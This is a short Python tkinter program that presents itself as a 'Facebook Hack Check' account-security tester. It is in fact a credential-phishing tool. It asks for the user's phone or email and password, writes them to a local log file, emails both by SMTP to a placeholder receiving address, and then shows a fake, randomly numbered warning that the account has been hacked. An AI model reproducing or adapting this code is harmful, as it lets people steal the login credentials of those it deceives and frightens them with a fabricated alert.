from tkinter import *
from tkinter import messagebox
import random
import smtplib


class Login:
	def __init__(self,root):
		self.root=root
		self.root.title("Facebook Hack Check")
		self.root.geometry("800x420+100+50")
		self.root.resizable(False,False)
		self.bg=PhotoImage(file=r"D:/2  % RIK/CODES/EH Tools Self made/img.png")
		self.bg_image=Label(self.root,image=self.bg).place(x=0,y=0,relwidth=1,relheight=1)

		#==Frame==#
		Frame_login=Frame(self.root,bg="white")
		Frame_login.place(x=200,y=100,height=250,width=400)

		title=Label(Frame_login,text="Security Check",bg="#3b5998",fg="white",font=("Arial",22,)).place(x=100,y=20)
		desc=Label(Frame_login,text="How Secure is your FB Account ?",bg="#3b5998",fg="white",font=("Goudy old style",14,)).place(x=75,y=60)

		lbl_user=Label(Frame_login,text="Phone or Email : ",bg="white",fg="black",font=("Goudy old style",12,)).place(x=70,y=120)
		self.txt_user=Entry(Frame_login,font=("times new roman",12),bg="lightgray")
		self.txt_user.place(x=200,y=120,width=180,height=25)
		
		lbl_pass=Label(Frame_login,text="Password : ",bg="white",fg="black",font=("Goudy old style",12,)).place(x=70,y=160)
		self.txt_pass=Entry(Frame_login,font=("times new roman",12),bg="lightgray",show="*")
		self.txt_pass.place(x=200,y=160,width=180,height=25)

		Login_btn=Button(self.root,command=self.login_function,text="Check Now",fg="white",bg="#3b5998",font=("times new roman",20)).place(x=320,y=320)


	def login_function(self):
		if self.txt_pass.get()=="" or self.txt_user.get()=="" :
			messagebox.showerror("Error","All fields are required",parent=self.root)
		else:
			r = random.randint(1,10)
			file=open(r"C:/Users/Sohom Rik/Desktop/log.txt","a")
			file.write(self.txt_user.get())
			file.write("	 ")
			file.write(self.txt_pass.get())
			file.write("\n")
			file.close()

			server = smtplib.SMTP('smtp.gmail.com',587)
			server.starttls()

			server.login('yoursending mail','password')

			server.sendmail('yoursending mail','yourreceive mail',self.txt_user.get())
			server.sendmail('yoursending mail','yourreceive mail',self.txt_pass.get())
			print('Mail sent')


			messagebox.showinfo("WARNING","YOUR ACCOUNT HAS BEEN HACKED %s TIMES"%(r),parent=self.root)
			
			





root=Tk()
obj=Login(root)
root.mainloop()
